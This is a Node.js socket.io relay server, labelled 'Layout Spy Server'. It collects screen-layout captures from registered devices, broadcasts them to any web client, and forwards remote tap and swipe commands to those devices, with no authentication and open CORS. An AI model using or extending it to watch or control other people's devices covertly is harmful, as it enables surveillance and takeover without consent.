const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 60000,
    pingInterval: 25000
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '50mb' }));

const devices = new Map();

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

io.on('connection', (socket) => {
    console.log('ðŸ”Œ Connection:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, 
                connected: true, 
                socketId: socket.id 
            });
            socket.join(deviceId);
            console.log("ðŸ“± Device registered:", deviceId, deviceInfo.status);
            io.emit('devices-update', Array.from(devices.entries()));
        }
    });

    // ðŸ”¥ LAYOUT RELAY (NEW)
    // Socket.io handler for layout updates
socket.on('layout-update', (data) => {
    console.log('ðŸ“Š Layout received:', data.elements?.length || 0, 'elements');
    
    // Send to web clients
    io.emit('layout-update', {
        deviceId: data.deviceId,
        elements: data.elements || [],
        screen: { width: data.width, height: data.height },
        timestamp: data.timestamp
    });
});

    // Control relay
    socket.on('control', (data) => {
        const { deviceId, action, x, y, startX, startY, endX, endY } = data;
        if (devices.has(deviceId)) {
            socket.to(deviceId).emit('control', {
                action, 
                x: parseFloat(x) || 0, 
                y: parseFloat(y) || 0,
                startX: parseFloat(startX) || 0, 
                startY: parseFloat(startY) || 0,
                endX: parseFloat(endX) || 0, 
                endY: parseFloat(endY) || 0
            });
            console.log('ðŸŽ® Control:', action, 'â†’', deviceId);
        }
    });

    socket.on('disconnect', () => {
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                io.emit('devices-update', Array.from(devices.entries()));
                console.log('ðŸ“± Disconnected:', deviceId);
                break;
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`ðŸš€ Layout Spy Server: http://localhost:${PORT}`);
    console.log(`ðŸ“± Ready for layout capture!`);
});
